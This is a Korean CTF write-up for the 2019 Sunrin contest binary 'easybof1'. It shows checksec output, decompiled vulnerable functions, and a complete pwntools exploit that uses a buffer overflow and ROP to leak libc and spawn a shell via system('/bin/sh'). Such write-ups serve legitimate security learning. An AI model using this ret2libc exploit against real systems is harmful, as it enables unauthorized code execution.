---
title: "2019 선린 교내해킹방어대회 easybof1"
date: 2019-11-15
tags: [Sunrin]
categories: [CTF]
---

stripped된 64bit 바이너리가 주어진다.

```
[/vagrant/hack]$ checksec easybof
[*] '/vagrant/hack/easybof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`+SUNRIN+` 으로 맞춰주면서 exit 안되게 해주고  `sub_400873` 으로 가서 libc leak해주면 된다.

```c
int sub_40079A()
{
  int result; // eax
  char buf; // [rsp+0h] [rbp-200h]
  char s; // [rsp+100h] [rbp-100h]
  char v3; // [rsp+108h] [rbp-F8h]

  memset(&s, 0, 0x100uLL);
  memset(&buf, 0, 0x100uLL);
  *&s = '_NIRNUS_';
  v3 = 0;
  puts("Are you ready??");
  write(1, "A : ", 4uLL);
  read(0, &buf, 264uLL);
  puts("checking...");
  sleep(0);
  result = strcmp(&s, "+SUNRIN+");
  if ( result )
  {
    puts("nono..");
    exit(-1);
  }
  return result;
}
```

그리고 릭해준 다음 `pop rdi` 로 main으로 간 다음에 `libc_base` 값 맞춰준 다음에 익스해주면 된다.

```c
ssize_t sub_400873()
{
  char s; // [rsp+0h] [rbp-100h]

  memset(&s, 0, 0x100uLL);
  puts("okay! go!!!!");
  return read(0, &s, 292uLL);
}
```

exploit.py

```python
from pwn import *

# context.log_level ='debug'
context.arch = 'amd64'
p = process('./easybof')
e = ELF('./easybof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
# libc = ELF('libc6_2.27-3ubuntu1_amd64.so', checksec=False)

main = 0x00000000004008BF
prdi = 0x0000000000400953 # pop rdi ; ret
payload = 'A'*(0x200-0x100)
payload += '+SUNRIN+'
p.sendafter(': ',payload)

payload2 = 'A'*0x108
payload2 += flat(prdi,e.got['puts'],e.plt['puts'])
payload2 += p32(main)

p.sendafter('okay! go!!!!\n',payload2)
puts = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00")
log.info('puts : ' + hex(puts))
libc_base = puts - libc.symbols['puts']
log.info('libc_base : ' + hex(libc_base))

p.sendafter(': ',payload)

payload3 = 'A'*0x108
payload3 += flat(prdi,libc_base+next(libc.search('/bin/sh\x00')),libc_base+libc.symbols['system'])
p.sendafter('okay! go!!!!\n',payload3)

p.interactive()
```

